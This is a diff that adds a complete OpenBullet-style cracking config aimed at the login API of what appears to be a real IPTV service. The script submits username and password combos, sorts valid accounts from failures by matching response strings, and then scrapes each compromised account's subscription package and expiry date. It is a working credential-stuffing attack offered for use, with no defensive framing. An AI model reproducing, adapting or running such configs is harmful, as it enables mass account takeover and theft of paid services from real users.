@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "mgoldiptv",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-27T21:26:47.4873046+03:00",
+  "AdditionalInfo": "www.siberdeyiz.com",
+  "Author": "By_Num",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#(Giriş) REQUEST POST "http://dnc.mgoldiptv.com/webtv/api/giris.php" 
+  CONTENT "username=<USER>&password=<PASS>&login=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#doğrulama KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "u015fifrenizi kontrol ediniz" 
+    KEY "{\"status\":0,\"error" 
+  KEYCHAIN Success OR 
+    KEY "﻿{\"status\":1}" 
+
+#bilgiler_giriş REQUEST GET "http://dnc.mgoldiptv.com/webtv/kullanicidetaylari.php" ParseQuery=TRUE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Paket PARSE "<SOURCE>" LR "PAKETİNİZ:</b></span> <span style=\"font-size: 14px; color: #04c1d4;\">" "</b>" -> CAP "PAKET" 
+
+#son_kullanma_tarihi PARSE "<SOURCE>" LR "Üyelik Sona Erme Tarihiniz:" "<a" -> CAP "TARİH" 
+
